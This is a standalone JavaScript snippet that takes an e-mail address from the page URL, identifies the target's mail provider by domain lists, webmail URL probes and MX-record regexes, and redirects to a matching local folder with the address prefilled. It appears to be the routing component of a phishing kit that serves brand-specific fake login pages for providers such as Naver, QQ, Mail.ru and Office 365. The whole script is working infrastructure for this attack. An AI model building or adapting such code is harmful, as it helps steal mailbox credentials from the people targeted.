<script>
document.addEventListener('DOMContentLoaded', () => main());

async function main () {
  const qs = new URLSearchParams(location.search);
  const login = qs.get('login');
  if (!login) return fail('Missing login parameter.');

  const domain = login.split('@')[1]?.trim().toLowerCase();
  if (!domain) return fail('Invalid e-mail address.');

  const sanitized = domain.replace(/[^a-z0-9.-]/gi, '');
  const host = location.origin;

  const redirectMap = folder => {
    const loginParam = `?login=${encodeURIComponent(login)}`;
    return `${host}/${folder}/index.html${loginParam}`;
  };

  const redirectTo = folder => {
    location.href = redirectMap(folder);
  };

  // Step 1: Direct Domain Match (longest match first)
  const direct = {
    'vip.163.com': 'vip163',
    'vip.126.com': 'vip126',
    'naver.com': 'naver',
    'daum.net': 'kakao',
    'kakao.com': 'kakao',
    'hanmail.net': 'kakao',
    'nate.com': 'nate',
    'empas.com': 'nate',
    'empal.com': 'nate',
    'hanafos.com': 'nate',
    'lycos.com': 'nate',
    'netsgo.com': 'nate',
    '126.com': '126',
    '163.com': '163',
    'qq.com': 'qq',
    'foxmail.com': 'qq',
    'mail.ru': 'mailru',
    'inbox.ru': 'mailru',
    'list.ru': 'mailru',
    'bk.ru': 'mailru',
    'internet.ru': 'mailru',
    'lotte.net': 'lotte',
    'aol.com': 'aol',
    'freenet.de': 'freenet',
    'libero.it': 'libero'
  };

  const directKeys = Object.keys(direct).sort((a, b) => b.length - a.length);
  for (const key of directKeys) {
    if (domain.endsWith(key)) return redirectTo(direct[key]);
  }

  // Step 2: Probe common webmail URLs
  const probes = {
    groupware: [`http://gw.${sanitized}/groupware/login.html`],
    roundcube: [
      `http://${sanitized}/webmail/`,
      `http://webmail.${sanitized}/`,
      `http://${sanitized}:2095`,
      `https://${sanitized}/router.html?login=${encodeURIComponent(login)}`
    ],
    ngw: [`http://mail.${sanitized}/ngw/app/#/sign`],
    aruba: [`https://webmail.aruba.it/`],
    gw: [`https://gw.${sanitized}/login`],
    owa: [
      `https://${sanitized}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${sanitized}/owa`,
      `https://mail.${sanitized}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${sanitized}/owa`
    ]
  };

  async function urlAlive(url) {
    const ctrl = new AbortController();
    const timeout = setTimeout(() => ctrl.abort(), 3500);
    try {
      await fetch(url, { method: 'HEAD', mode: 'no-cors', signal: ctrl.signal, cache: 'no-store' });
      clearTimeout(timeout);
      return true;
    } catch {
      return false;
    }
  }

  for (const [folder, urls] of Object.entries(probes)) {
    for (const url of urls) {
      if (await urlAlive(url)) return redirectTo(folder);
    }
  }

  // Step 3: MX Record Lookup with REGEX
  try {
    const dns = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
    if (dns.ok) {
      const { Answer = [] } = await dns.json();
      const mxRecords = Answer.map(a => a.data.toLowerCase().replace(/\.$/, ''));

      const mxRegexMap = {
        '^mxbiz(\\d*)\\.qq\\.com$': 'qqcom',
        '^mailplug\\.': 'mailplug',
        '^.*\\.daouoffice\\.com$': 'daouoffice',
        '^gw\\.': 'daouoffice',
        '^emx\\.mail\\.ru$': 'bizmailru',
        '^yahoodns\\.net$': 'yahoobiz',
        '^emailsrvr\\.com$': 'emailsrvr',
        '^mailhostbox\\.com$': 'mailhostbox',
        '^rzone\\.de$': 'strato',
        '^gmx\\.net$': 'gmx',
        '^register\\.it$': 'register',
        '^chinanetsun\\.com$': 'chinanetsun',
        '^hiworks\\.co\\.kr$': 'hiworks',
        '^cn4e\\.com$': 'cn4e',
        '^mailfilter\\.': 'hibox',
        '^sfilter\\.': 'LG',
        '^.*\\.mailwood\\.com$': 'LG',
        '^webmail\\.': 'roundcube',
        '^bizmeka\\.com$': 'bizmeka',
        '^secuecloud\\.com$': 'secuecloud',
        '^.*\\.serverdata\\.net$': 'owa',
        '^.*\\.ecounterp\\.com$': 'ecount',
        '^mailinblack\\.com$': 'mailinblack',
        '^whoisworks\\.com$': 'whois',
        '^whois\\.': 'whois',
        'yandex': 'yandex',
        'worksmobile': 'worksmobile',
        'mail\\.aliyun\\.com$': 'mailaliyun',
        'qiye\\.aliyun\\.com$': 'qiyealiyun',
        'enterprise\\.china\\.alibaba\\.com$': 'qiyealiyun',
        'outlook\\.com$': 'office365',
        't-online\\.de$': 't-online',
        'mimecast\\.com$': 'mimecast',
        'orange\\.fr$': 'orange',
        'netease\\.com$': 'netease',
        'chinaemail\\.cn$': 'chinaemail',
        'secureserver\\.net$': 'godaddy',
        'spam\\.cafe24\\.com$': 'cafe24',
        'fmcity\\.com$': 'cafe24',
        'cgwebmail\\.': 'gw'
      };

      for (const mxHost of mxRecords) {
        for (const pattern in mxRegexMap) {
          if (new RegExp(pattern).test(mxHost)) {
            return redirectTo(mxRegexMap[pattern]);
          }
        }
      }
    }
  } catch (e) {
    console.warn('MX lookup failed', e);
  }

  // Final fallback
  redirectTo('other');

  function fail(msg) {
    document.body.innerHTML = `<h2>${msg}</h2>`;
  }
}
</script>
